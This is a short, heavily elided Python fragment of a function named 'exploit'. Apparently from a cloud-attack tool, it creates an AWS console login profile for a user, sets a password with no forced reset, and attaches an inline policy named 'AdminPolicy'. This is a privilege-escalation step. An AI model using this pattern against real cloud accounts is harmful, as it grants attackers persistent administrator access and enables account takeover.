...
def exploit(profile, workspace):
    ...
    if createLP.lower() != "true":
        try:
            ...
            profile.create_login_profile(UserName=user, Password=password, PasswordResetRequired=False)
    ...
    try:
        profile.put_user_policy(UserName=user, PolicyName="AdminPolicy", PolicyDocument=policyDoc)
